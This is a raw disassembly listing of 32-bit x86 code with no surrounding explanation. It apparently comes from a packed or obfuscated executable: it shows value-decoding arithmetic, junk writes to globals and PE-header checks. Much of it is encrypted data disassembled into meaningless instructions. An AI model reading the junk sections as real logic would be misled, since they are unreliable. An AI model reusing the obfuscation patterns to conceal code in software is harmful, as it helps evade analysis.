  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x4306d6,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42efb0,0x4306d2
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ef90,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x430622,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x4306ce,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x430632,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x430636,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0x5718c948,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1ba
  40a236:	repz jns 0x40a20c
  40a239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a23a:	js     0x40a269
  40a23c:	in     eax,dx
  40a23d:	nop
  40a23e:	not    DWORD PTR [esi]
  40a240:	(bad)  
  40a241:	jne    0x40a227
  40a243:	xor    ch,BYTE PTR [edx-0x7]
  40a246:	ja     0x40a22b
  40a248:	sbb    DWORD PTR [esi+0x2e634bca],ebp
  40a24e:	ds test eax,0x500103e
  40a254:	cmp    BYTE PTR [edi+0x22],dl
  40a257:	fs gs xchg edi,eax
  40a25a:	daa    
  40a25b:	repnz dec ebp
  40a25d:	adc    BYTE PTR [eax],al
  40a25f:	les    esi,FWORD PTR [esi+0x3a77cf72]
  40a265:	jo     0x40a267
  40a267:	ss aas 
  40a269:	push   ebp
  40a26a:	outs   dx,DWORD PTR ds:[esi]
  40a26b:	push   cs
  40a26c:	jb     0x40a262
  40a26e:	ds jl  0x40a277
  40a271:	(bad)  
  40a273:	and    DWORD PTR [ecx+eiz*1+0x17cf2d7f],0x2343c7d3
  40a27e:	bnd jae 0x40a24b
  40a281:	add    al,0x8
  40a283:	mov    esi,0xab0e611e
  40a288:	mov    esp,0x301faba1
  40a28d:	fist   WORD PTR [edx-0x7b]
  40a290:	iret   
  40a291:	aad    0x5c
  40a293:	cmp    dh,dh
  40a295:	sub    dl,bh
  40a297:	test   eax,0x5245aec4
  40a29c:	mov    esp,0x63035013
  40a2a1:	and    al,0xee
  40a2a3:	and    al,0xe2
  40a2a5:	es adc al,BYTE PTR es:[ebp-0x6d]
  40a2aa:	(bad)  
  40a2ab:	ja     0x40a2d1
  40a2ad:	jl     0x40a26f
  40a2af:	ret    0x4db9
  40a2b2:	ror    BYTE PTR [eax+0x6307f551],1
  40a2b8:	or     DWORD PTR [eax],esp
  40a2ba:	rcr    ch,0x2b
  40a2bd:	dec    edx
  40a2be:	jecxz  0x40a2b6
  40a2c0:	lods   eax,DWORD PTR ds:[esi]
  40a2c1:	aaa    
  40a2c2:	call   0x8212590d
  40a2c7:	(bad)  
  40a2c8:	call   0x74fd82b8
  40a2cd:	push   edi
  40a2ce:	mov    DWORD PTR [esi+0x18],esp
  40a2d1:	(bad)  
  40a2d2:	mov    ch,0x6b
  40a2d4:	ret    0x846
  40a2d7:	pop    es
  40a2d8:	push   ds
  40a2d9:	jne    0x40a278
  40a2db:	xlat   BYTE PTR ds:[ebx]
  40a2dc:	in     eax,dx
  40a2dd:	int3   
  40a2de:	cmp    BYTE PTR [eax],ch
  40a2e0:	adc    DWORD PTR [edx-0x33],ebp
  40a2e3:	cld    
  40a2e4:	push   0xee9bd70
  40a2e9:	or     bh,BYTE PTR [ebx]
  40a2eb:	out    dx,al
  40a2ec:	sub    eax,0x66fdcd3c
  40a2f1:	and    esp,DWORD PTR [ebx-0x3c]
  40a2f4:	push   eax
  40a2f5:	pop    eax
  40a2f6:	push   ecx
  40a2f7:	mov    dl,0x93
  40a2f9:	push   ecx
  40a2fb:	(bad)
  40a2ff:	xor    BYTE PTR [ecx],0xde
  40a302:	adc    esi,DWORD PTR [ebx+0x4137ec1a]
  40a308:	je     0x40a34d
  40a30a:	ins    DWORD PTR es:[edi],dx
  40a30b:	cmp    ch,BYTE PTR [edi]
  40a30d:	and    edx,DWORD PTR [ecx-0x15944b1e]
  40a313:	mov    ah,0x6c
  40a315:	inc    eax
  40a316:	sbb    eax,0xeee90fa2
  40a31b:	test   al,0x78
  40a31d:	sti    
  40a31e:	daa    
  40a31f:	repz add BYTE PTR [eax+0x46],bh
  40a323:	xor    ecx,DWORD PTR [ebp-0x43efda18]
  40a329:	(bad)  
  40a32a:	test   eax,0x7b932f60
  40a32f:	inc    ebp
  40a330:	dec    ebx
  40a331:	sub    eax,DWORD PTR [ecx-0x47]
  40a334:	scas   eax,DWORD PTR es:[edi]
  40a335:	popa   
  40a336:	mov    ebp,0x35e8534f
  40a33b:	repz jmp 0x40a354
  40a33e:	rcr    BYTE PTR [ebx+0x7eec6834],cl
  40a344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a345:	adc    eax,0x91da1ef
  40a34a:	cwde   
  40a34b:	push   0x416a4c3a
  40a350:	pop    ebx
  40a351:	lock es dec edx
  40a354:	ds sbb ch,bh
  40a357:	or     eax,0x62cfe693
  40a35c:	lods   eax,DWORD PTR ds:[esi]
  40a35d:	lahf   
  40a35e:	jmp    0x7b26:0x7c35d0c9
  40a365:	adc    DWORD PTR [ebp+0x63],esp
  40a368:	fwait
  40a369:	jle    0x40a373
  40a36b:	outs   dx,DWORD PTR ds:[esi]
  40a36c:	or     ebp,DWORD PTR [ebp+0x24]
  40a36f:	mov    ebp,0x6272971a
  40a374:	add    ebx,esi
  40a376:	stos   BYTE PTR es:[edi],al
  40a377:	leave  
  40a378:	sub    al,0x2f
  40a37a:	cld    
  40a37b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a37c:	sbb    DWORD PTR [ecx],ebx
  40a37e:	call   0x5cf5:0x3f98f657
  40a385:	pop    es
  40a386:	arpl   WORD PTR [ebx-0x5ca18c1a],di
  40a38c:	aas    
  40a38d:	mov    ds:0x8831e7f5,al
  40a392:	xchg   edx,eax
  40a393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a394:	or     ch,bh
  40a396:	lock push 0xffffffec
  40a399:	cld    
  40a39a:	ins    BYTE PTR es:[edi],dx
  40a39b:	or     bh,BYTE PTR [edx-0x70ec9fd1]
  40a3a1:	cmp    esi,eax
  40a3a3:	ds push esp
  40a3a5:	out    0xd1,eax
  40a3a7:	mov    dl,0x42
  40a3a9:	jbe    0x40a3fa
  40a3ab:	mov    bl,0x87
  40a3ad:	inc    ebx
  40a3ae:	pop    edi
  40a3af:	push   di
  40a3b1:	outs   dx,DWORD PTR ds:[esi]
  40a3b2:	jl     0x40a41c
  40a3b4:	fwait
  40a3b5:	push   ecx
  40a3b6:	xchg   esp,eax
  40a3b7:	(bad)  
  40a3b8:	sub    eax,DWORD PTR [eax+0x4b1c34c2]
  40a3be:	add    ah,al
  40a3c0:	mov    dl,al
  40a3c2:	push   ecx
  40a3c3:	inc    ebp
  40a3c4:	test   DWORD PTR [ebx],ecx
  40a3c6:	mov    DWORD PTR [bp+di+0x28d6],ebx
  40a3cb:	into   
  40a3cc:	sub    DWORD PTR [eax+0x2],ecx
  40a3cf:	inc    edx
  40a3d0:	xor    al,0x15
  40a3d2:	scas   al,BYTE PTR es:[edi]
  40a3d3:	pusha  
  40a3d4:	mov    BYTE PTR [ecx],0x92
  40a3d7:	les    ebx,FWORD PTR [eax+0x2a20ab6d]
  40a3dd:	jecxz  0x40a3f1
  40a3df:	in     al,dx
  40a3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e1:	add    esi,edi
  40a3e3:	mov    ds:0xc5b28257,eax
  40a3e8:	ds cli 
  40a3ea:	push   ds
  40a3eb:	xchg   ebp,eax
  40a3ec:	push   edi
  40a3ed:	mov    edx,esi
  40a3ef:	cli    
  40a3f0:	sahf   
  40a3f1:	adc    al,0x55
  40a3f3:	adc    eax,0xb882f006
  40a3f8:	aas    
  40a3f9:	push   ebp
  40a3fa:	mov    ecx,ss
  40a3fc:	xchg   BYTE PTR [esi-0x4d7fc521],bh
  40a402:	clc    
  40a403:	repz test al,0xbe
  40a406:	add    dh,bl
  40a408:	out    dx,eax
  40a409:	push   ebp
  40a40a:	int3   
  40a40b:	xchg   ebp,eax
  40a40c:	mov    esi,0xdbc437eb
  40a411:	in     eax,0x64
  40a413:	or     cl,bh
  40a415:	xchg   di,ax
  40a417:	hlt    
  40a418:	pop    ecx
  40a419:	mov    ebp,ebx
  40a41b:	adc    DWORD PTR [ebx],0xffffff96
  40a41e:	sub    eax,0xf55c8cf2
  40a423:	int3   
  40a424:	push   0x7a62b577
  40a429:	addr16 daa 
  40a42b:	mov    eax,ds:0x990ae53f
  40a430:	fs cmp eax,0x105cc811
  40a437:	test   eax,0xad89f35e
  40a43c:	mul    al
  40a43e:	add    dh,BYTE PTR [esi]
  40a440:	rol    DWORD PTR [esi+0x1ad6f5a4],cl
  40a446:	div    DWORD PTR [esi+ecx*1+0x1a879907]
  40a44d:	sbb    al,0x96
  40a44f:	and    al,0x44
  40a451:	xor    eax,0x8955043
  40a456:	aas    
  40a457:	mov    cl,BYTE PTR [ebx]
  40a459:	mov    ecx,DWORD PTR [ebx+0x76]
  40a45c:	jecxz  0x40a4bd
  40a45e:	sbb    BYTE PTR [ebx],dh
  40a460:	mov    esi,0x6a41e482
  40a465:	dec    edx
  40a466:	pop    ebp
  40a467:	cmp    DWORD PTR [ebp-0x4f587656],ebp
  40a46d:	jno    0x40a40b
  40a46f:	aam    0xc9
  40a471:	adc    BYTE PTR [esi-0x7b8d0c5],dl
  40a477:	mov    ds:0x7c55581e,al
  40a47c:	(bad)  
  40a47d:	outs   dx,BYTE PTR ds:[esi]
  40a47e:	jecxz  0x40a4e5
  40a480:	jmp    0x2345:0x46b4eda
  40a487:	lahf   
  40a488:	sar    DWORD PTR [edx+0x37],0xc0
  40a48c:	push   edi
  40a48e:	stos   BYTE PTR es:[edi],al
  40a48f:	inc    eax
  40a490:	xchg   edx,edx
  40a492:	sti    
  40a493:	jo     0x40a4d5
  40a495:	adc    al,0x8b
  40a497:	inc    ebp
  40a498:	or     bh,al
  40a49a:	add    eax,0x4306c2
  40a49f:	pop    ss
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [ebx+0x4306c23d],al
  40a4a8:	add    BYTE PTR [eax],al
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x4306c2,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42ec64
  40a4c6:	mov    ecx,DWORD PTR ds:0x4306c2
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x4306c2,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x7303a360
  40a537:	mov    ds:0x7ee8b4c6,al
  40a53c:	jle    0x40a51d
  40a53e:	jo     0x40a5be
  40a540:	jle    0x40a569
  40a542:	add    al,0x25
  40a544:	mov    ah,0x13
  40a546:	rcr    BYTE PTR [ecx+eiz*8+0x4c6759f7],1
  40a54d:	xchg   ecx,eax
  40a54e:	out    0xde,al
  40a550:	inc    ebx
  40a551:	jmp    0xc90c:0x4358b65d
  40a558:	sub    dh,dl
  40a55a:	and    eax,0x21b5c3aa
  40a55f:	mov    ds:0xf0dfadba,al
  40a564:	or     bl,BYTE PTR [ebx-0x693cb838]
  40a56a:	jbe    0x40a58b
  40a56c:	cdq    
  40a56d:	loope  0x40a502
  40a56f:	leave  
  40a570:	jmp    0xe049:0xdf741b6
  40a577:	add    eax,0xd5f76841
  40a57c:	ret    0xb931
  40a57f:	push   eax
  40a580:	push   ss
  40a581:	mov    eax,0x1922a598
  40a586:	pop    edi
  40a587:	ret    0x3f13
  40a58a:	pop    ebx
  40a58b:	add    bl,dl
  40a58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a58e:	rcl    DWORD PTR [ecx-0x261c40a3],0x27
  40a595:	mov    WORD PTR [esi],es
  40a597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a598:	imul   esi,DWORD PTR ds:0x7943729d,0xffffff89
  40a59f:	shl    ecx,cl
  40a5a1:	mov    ebx,0xe14db74b
  40a5a6:	jbe    0x40a529
  40a5a8:	and    BYTE PTR [esp+edi*4-0x45],bl
  40a5ac:	faddp  st(2),st
  40a5ae:	imul   ecx,DWORD PTR [eax-0x9],0x71916859
  40a5b5:	mov    WORD PTR [ecx],es
  40a5b7:	jecxz  0x40a59b
  40a5b9:	jecxz  0x40a632
  40a5bb:	jae    0x40a5f8
  40a5bd:	sub    BYTE PTR ds:0x6d48ebfd,cl
  40a5c3:	jbe    0x40a5da
  40a5c5:	dec    ecx
  40a5c6:	daa    
  40a5c7:	outs   dx,DWORD PTR ds:[esi]
  40a5c8:	enter  0xb956,0x9f
  40a5cc:	scas   eax,DWORD PTR es:[edi]
  40a5cd:	outs   dx,BYTE PTR ds:[esi]
  40a5ce:	pop    es
  40a5cf:	mov    edi,esi
  40a5d1:	adc    al,0x4d
  40a5d3:	jb     0x40a5c0
  40a5d5:	push   ds
  40a5d6:	fprem1 
  40a5d8:	cmp    al,ch
  40a5da:	push   ds
  40a5db:	pop    eax
  40a5dc:	in     eax,0x25
  40a5de:	shl    dh,cl
  40a5e0:	outs   dx,DWORD PTR ds:[esi]
  40a5e1:	pop    ecx
  40a5e2:	sbb    al,bh
  40a5e4:	mov    WORD PTR [edx],es
  40a5e6:	inc    eax
  40a5e7:	mov    DWORD PTR [ecx],eax
  40a5e9:	mov    esp,0x8d689922
  40a5ee:	mov    DWORD PTR [eax+ecx*1+0x697d2566],eax
  40a5f5:	adc    bl,bl
  40a5f7:	mov    ebp,0x95e4c08a
  40a5fc:	add    bl,BYTE PTR [ebx-0x42]
  40a5ff:	add    esp,ebx
  40a601:	ss repnz mov ebx,0x7b9655fc
  40a608:	jnp    0x40a5c2
  40a60a:	jg     0x40a5af
  40a60c:	xchg   ecx,eax
  40a60d:	mov    WORD PTR fs:[esi],ss
  40a610:	fsubr  QWORD PTR [ebx]
  40a612:	sub    BYTE PTR [ecx],bh
  40a614:	sbb    eax,0x686c4f0b
  40a619:	mov    BYTE PTR [ebp-0x3b],cl
  40a61c:	mov    bl,0x67
  40a61e:	mov    cl,0x20
  40a620:	xor    cl,BYTE PTR [esi-0x290a7dbe]
  40a626:	xor    al,0xab
  40a628:	mov    esp,0xd13efb5f
  40a62d:	test   al,0x73
  40a62f:	or     eax,0x88a236ad
  40a634:	xchg   esi,eax
  40a635:	cwde   
  40a636:	sbb    al,0x27
  40a638:	dec    edi
  40a639:	xor    eax,0xf1b241d9
  40a63e:	shl    DWORD PTR [eax+0x57ca44ac],cl
  40a644:	cs ins BYTE PTR es:[edi],dx
  40a646:	sbb    al,0xae
  40a648:	in     al,0x97
  40a64a:	cmp    eax,DWORD PTR [ecx+0x72]
  40a64d:	dec    ebp
  40a64e:	pop    edi
  40a64f:	dec    ecx
  40a650:	retf   0x982b
  40a653:	enter  0xa754,0x42
  40a657:	push   edx
  40a658:	push   eax
  40a659:	cli    
  40a65a:	retf   0xefc1
  40a65d:	ds dec edx
  40a65f:	ficom  DWORD PTR [esi-0x2a390d45]
  40a665:	stos   DWORD PTR es:[edi],eax
  40a666:	hlt    
  40a667:	leave  
  40a668:	(bad)  
  40a669:	fsubr  DWORD PTR [ebx+0x50]
  40a66c:	pop    ss
  40a66d:	test   eax,0xaf7acd6f
  40a672:	adc    bh,dh
  40a674:	(bad)  
  40a675:	jnp    0x40a63c
  40a677:	xchg   ebp,eax
  40a678:	push   ebp
  40a679:	dec    ecx
  40a67a:	push   esp
  40a67b:	xchg   DWORD PTR [esi],edx
  40a67d:	push   0x5e3bc701
  40a682:	cs push ss
  40a684:	xchg   esi,eax
  40a685:	cmp    ch,BYTE PTR [ebx+0x6b574e73]
  40a68b:	scas   al,BYTE PTR es:[edi]
  40a68c:	mov    BYTE PTR [ecx+0x24249d5b],al
  40a692:	aam    0xe
  40a694:	mov    ?,WORD PTR [ecx]
  40a696:	dec    ecx
  40a697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a698:	out    dx,eax
  40a699:	aaa    
  40a69a:	inc    edx
  40a69b:	mov    ebx,0x381b8af5
  40a6a0:	jbe    0x40a638
  40a6a2:	push   edi
  40a6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6a4:	shl    DWORD PTR [esi-0x2e],0x25
  40a6a8:	imul   ebp,DWORD PTR ds:0x6766359b,0x59399c41
  40a6b2:	cmp    cl,BYTE PTR [esi-0x59]
  40a6b5:	push   0x6c
  40a6b7:	jo     0x40a660
  40a6b9:	and    dh,BYTE PTR ss:[esi+0x76]
  40a6bd:	ror    ebx,0xb2
  40a6c0:	(bad)  
  40a6c1:	(bad)  
  40a6c2:	jne    0x40a6f2
  40a6c4:	(bad)  
  40a6c6:	repz pop ebx
  40a6c8:	pop    ecx
  40a6c9:	inc    ebp
  40a6ca:	sbb    al,0x9
  40a6cc:	xor    ebp,edi
  40a6ce:	and    ecx,DWORD PTR [edi]
  40a6d0:	popw   ss
  40a6d2:	xchg   ebx,eax
  40a6d3:	mov    al,ds:0x1c9a1ee
  40a6d8:	dec    edx
  40a6d9:	aad    0xd7
  40a6db:	mov    esi,0x78d3adc4
  40a6e0:	sbb    DWORD PTR [ebx+0x39e1a2d6],0x13
  40a6e7:	mov    dh,0x87
  40a6e9:	stos   BYTE PTR es:[edi],al
  40a6ea:	in     eax,dx
  40a6eb:	retf   
  40a6ec:	push   ds
  40a6ed:	jns    0x40a6c8
  40a6ef:	shl    edi,cl
  40a6f1:	push   esp
  40a6f2:	adc    al,0xe
  40a6f4:	sbb    ecx,DWORD PTR [eax+0x29c2ce4a]
  40a6fa:	pop    edx
  40a6fb:	jb     0x40a74e
  40a6fd:	fcmovnbe st,st(3)
  40a6ff:	rcr    DWORD PTR [ebx],cl
  40a701:	je     0x40a686
  40a703:	mov    cl,0xa2
  40a705:	das    
  40a706:	adc    BYTE PTR [eax],ch
  40a708:	in     al,dx
  40a709:	jecxz  0x40a786
  40a70b:	sbb    ecx,DWORD PTR [esp+edi*8]
  40a70e:	dec    edx
  40a70f:	jns    0x40a6a0
  40a711:	pop    esi
  40a712:	pusha  
  40a713:	dec    ebx
  40a714:	mov    ds:0xcc597f4c,al
  40a719:	mov    bh,0xde
  40a71b:	ret    0x6ec6
  40a71e:	lds    ecx,FWORD PTR [ebp+0x107a33c5]
  40a724:	dec    edx
  40a725:	cwde   
  40a726:	jge    0x40a716
  40a728:	(bad)  
  40a729:	jno    0x40a759
  40a72b:	(bad)  
  40a72c:	test   eax,0x924d8ae8
  40a731:	sub    ecx,ebp
  40a733:	xchg   BYTE PTR [ecx+edi*1],dl
  40a736:	push   0xffffffa6
  40a738:	frstor [edx+0x29]
  40a73b:	test   eax,edi
  40a73d:	cmc    
  40a73e:	jmp    0x40a78f
  40a740:	mov    dl,0xfa
  40a742:	(bad)
  40a746:	in     eax,dx
  40a747:	div    BYTE PTR [edx-0x2b1ee92d]
  40a74d:	xchg   ecx,eax
  40a74e:	xor    esp,DWORD PTR [esi]
  40a750:	adc    edx,esp
  40a752:	test   BYTE PTR [ebx-0x1d],bl
  40a755:	mov    esi,0x3d6e7978
  40a75a:	jo     0x40a79c
  40a75c:	(bad)  
  40a75d:	push   edi
  40a75e:	xor    al,BYTE PTR [edi-0x3c719368]
  40a764:	retf   0x9152
  40a767:	xchg   DWORD PTR ds:0x58afd14c,edi
  40a76d:	out    0xa0,eax
  40a76f:	mov    bl,0xf6
  40a771:	jl     0x40a7ce
  40a773:	cmp    esi,esi
  40a775:	dec    ebp
  40a776:	jge    0x40a767
  40a778:	push   edx
  40a779:	mov    eax,ds:0x2404087f
  40a77e:	pop    ebp
  40a77f:	mov    dl,0xf1
  40a781:	shl    ch,0x30
  40a784:	cwde   
  40a785:	scas   al,BYTE PTR es:[edi]
  40a786:	push   ebp
  40a787:	pop    edx
  40a788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a789:	mov    esp,0xd668ac9c
  40a78e:	in     eax,dx
  40a78f:	data16 fdivr DWORD PTR [edi]
  40a792:	jmp    0x3b3532bc
  40a797:	dec    edx
  40a798:	mov    ecx,0x70ec7f9f
  40a79d:	into   
  40a79e:	and    ecx,DWORD PTR [ecx-0x62fa86a9]
  40a7a4:	jb     0x40a7d8
  40a7a6:	add    cl,cl
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43061e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43061e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43061e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43061e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43061e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ed50
  40a7f1:	cmp    DWORD PTR ds:0x43061e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43061e
  40a803:	inc    eax
  40a804:	mov    ds:0x43061e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x430652
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x430656
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
